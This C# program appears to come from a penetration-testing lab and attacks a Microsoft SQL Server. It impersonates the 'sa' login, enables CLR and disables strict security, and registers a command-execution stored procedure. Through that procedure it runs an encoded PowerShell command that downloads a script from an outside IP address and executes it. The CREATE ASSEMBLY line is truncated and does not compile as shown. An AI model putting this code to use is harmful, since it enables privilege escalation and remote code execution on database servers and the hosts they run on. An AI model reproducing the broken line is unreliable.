using System;
using System.Data.SqlClient;

namespace CustomAssemblies
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server \"" + sqlServer + "\" successfully!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication to MSSQL Server \"" + sqlServer + "\" failed!");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to user: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"public\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"public\" role!");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"sysadmin\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"sysadmin\" role!");
            }
            reader.Close();

            String queryLoginsAllowImpersonation = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(queryLoginsAllowImpersonation, con);
            reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: \"" + reader[0] + "\"");
            }
            reader.Close();

            Console.WriteLine("[*] Attempting Impersonation...");
            String ExecuteAS = "EXECUTE AS LOGIN = 'sa';";
            // String ExecuteAS = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(ExecuteAS, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(querylogin, con);   // String querylogin = "SELECT SYSTEM_USER;";
            // command = new SqlCommand(queryuser, con);   // String queryuser = "SELECT USER_NAME();";
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] After Impersonation: Now Executing in the Context of: \"" + reader[0] + "\"");
            reader.Close();

            String Enable_Options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE";
            command = new SqlCommand(Enable_Options, con);
            reader = command.ExecuteReader();
            reader.Close();

            String CreateAsm = "CREATE ASSEMBLY myAssembly FROM 
            command = new SqlCommand(CreateAsm, con);
            reader = command.ExecuteReader();
            reader.Close();

            String CreatePro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            command = new SqlCommand(CreatePro, con);
            reader = command.ExecuteReader();
            reader.Close();

            String ExecCmd = "EXEC cmdExec 'powershell.exe -exec bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwAwAC8AcgB1AG4ANgA0AC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==';";
            command = new SqlCommand(ExecCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}